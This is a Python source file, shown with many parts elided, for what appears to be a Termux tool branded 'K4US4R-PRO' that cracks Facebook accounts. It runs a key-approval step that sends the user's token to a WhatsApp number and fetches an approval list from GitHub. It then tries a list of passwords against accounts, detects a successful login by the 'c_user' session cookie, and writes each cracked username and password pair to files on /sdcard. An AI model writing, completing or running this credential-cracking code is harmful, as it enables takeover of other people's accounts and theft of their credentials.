...
def main_apv():
    ...
    try:
        ...
        print ("  Your Token Is Not Approved Add permeant  Then Approved Your Key")
        ...
        os.system('am start https://wa.me/03105194032?text=' + tks)

        

    r1=requests.get("https://github.com/SUBHANOk/PRO.SO64-32/blob/main/Approval.txt").text
...
\x1b[1;92m.##....##.##.....##..#######...######..##.....##.##.....##
 ...
 [$]*****************************************************[$]
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : { Mr.Abdullah }   ║
   \x1b[1;92m║ AUTHOR    : MR. K4US4R      ║
   \x1b[1;92m║ GITHUB    : git.me/Mr.Abdullah ║
   \x1b[1;92m║ FACEBOOK  : Brand Ahamed   ║
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/K4US4R-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/K4US4R-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back K4US4R-PRO Tools")
...
def R():
			...
			print ("\033[1m [!] Tool    : K4US4R-PRO")

			print (" [!] Brand   : MrK4US4R")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [K4US4R-OK 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/K4US4R_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/K4US4R_CP.txt' , 'a').write('%s\n' % wrt)
...
class load:
    ...
    def __init__(self):
        ...
        for t in range(int("1")):
            ...
            print('\r Please Wait Bro Loading......................')
